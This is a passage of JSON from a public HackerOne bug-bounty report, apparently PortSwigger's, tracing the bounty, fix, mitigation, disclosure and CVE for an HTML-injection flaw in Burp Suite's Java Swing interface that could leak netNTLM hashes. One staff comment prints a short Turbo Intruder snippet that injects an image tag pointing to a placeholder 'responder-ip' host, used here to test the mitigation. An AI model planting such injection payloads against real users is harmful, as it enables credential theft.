","automated_response":false,"created_at":"2020-12-18T16:33:59.922Z","updated_at":"2020-12-18T16:33:59.922Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10145788,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks to your excellent report, we've patched this specific bug and are actively developing a broader mitigation to prevent Java disclosing NTLM creds. We will be marking this issue as resolved and open to public disclosure as soon as the broader mitigation lands.","automated_response":false,"created_at":"2020-12-18T16:55:21.762Z","updated_at":"2020-12-18T16:55:21.762Z","actor":{"url":"/portswigger","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/252/60e8778f4f1fee57ea2b164a7d2ec1e2d2dd7bc8_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"PortSwigger Web Security"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"portswigger","collaborator":{"username":"issuefinder","url":"/issuefinder"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10173260,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the bounty :)\n\nI also want to thank the following colleagues who helped me during the exploitation phase:\n- ipujol\n- interhack\n- revil\n- ri0t\n\nI will wait until the issue is marked as resolved and open to public disclosure to write a blog post.","automated_response":false,"created_at":"2020-12-22T07:39:00.994Z","updated_at":"2020-12-22T07:39:00.994Z","actor":{"username":"issuefinder","cleared":false,"url":"/issuefinder","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10945674,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry for the delayed response. We released our broader mitigation one month ago in 2021.2. This should mean other occurrences of HTML injection can't be used for credential theft. For example, you can trigger HTML injection in Turbo Intruder with the following snippet, but this should be mostly harmless:\n\n```\ndef handleResponse(req, interesting):\n    req.label = '\u003chtml\u003e\u003cimg src=\"http://responder-ip\"/\u003e\u003c/img\u003e'\n    table.add(req)\n```\n\nCan you confirm if this mitigation is working from your end?","automated_response":false,"created_at":"2021-03-10T13:24:46.045Z","updated_at":"2021-03-10T13:24:46.045Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10983200,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, from my end both work fine (quick fix and broader mitigation).","automated_response":false,"created_at":"2021-03-13T14:55:24.645Z","updated_at":"2021-03-13T14:55:24.645Z","actor":{"username":"issuefinder","cleared":false,"url":"/issuefinder","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10984477,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Excellent, thanks for checking. Feel free to blog about this and/or request disclosure.","automated_response":false,"created_at":"2021-03-13T19:59:23.306Z","updated_at":"2021-03-13T19:59:23.306Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"issuefinder","url":"/issuefinder"},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11157739,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"I would like to request public disclosure of this report and share my intention to request a CVE for this vulnerability.\n\nFor the CVE, do you prefer to request it by yourself? It appears that HackerOne provides this service: https://docs.hackerone.com/programs/cve-requests.html.\nIf not, do you want to share any information to add to the CVE request?","automated_response":false,"created_at":"2021-03-28T19:37:52.395Z","updated_at":"2021-03-28T19:37:52.395Z","first_to_agree":true,"actor":{"username":"issuefinder","cleared":false,"url":"/issuefinder","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11161997,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"I'll request the CVE","automated_response":false,"created_at":"2021-03-29T09:27:47.846Z","updated_at":"2021-03-29T09:27:47.846Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11161999,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-03-29T09:27:47.979Z","updated_at":"2021-03-29T09:27:47.979Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11162274,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2021-03-29T09:41:03.506Z","updated_at":"2021-03-29T09:41:03.506Z","additional_data":{"old_title":"Unsolicited hidden request made by Burp Suite can be used to leak real public IP address or netNTLM hash, get RCE on other machines or produce a DoS.","new_title":"HTML Injection in Swing can disclose netNTLM hash or cause DoS"},"actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11177119,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","automated_response":false,"created_at":"2021-03-30T07:32:51.808Z","updated_at":"2021-03-30T07:32:51.808Z","cve_ids":["CVE-2021-29416"],"actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11177197,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's the CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29416","automated_response":false,"created_at":"2021-03-30T07:33:55.262Z","updated_at":"2021-03-30T07:33:55.262Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11187886,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks! I will share the blog post when it is published.","automated_response":false,"created_at":"2021-03-30T19:14:43.939Z","updated_at":"2021-03-30T19:14:43.939Z","actor":{"username":"issuefinder","cleared":false,"url":"/issuefinder","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"portswigger","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":34390,"category":"team","content":"@issuefinder found a vulnerability that could result in Burp Suite issuing requests that do not respect its upstream proxy configuration and could leak NetNTLM hashes on Windows systems that fail to block outbound SMB.\n\nThis was fixed in 2020.12, and additional hardening to prevent future injections being used to leak netNTLM hashes was introduced in 2021.2","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":56414,"username":"albinowax","name":"James Kettle","bio":"@albinowax","cleared":true,"website":"https://skeletonscribe.net/","location":"United Kingdom","created_at":"2016-02-15T11:34:15.992Z","url":"https://hackerone.com/albinowax","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"hacker_resume_enabled":true,"user_type":"hacker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}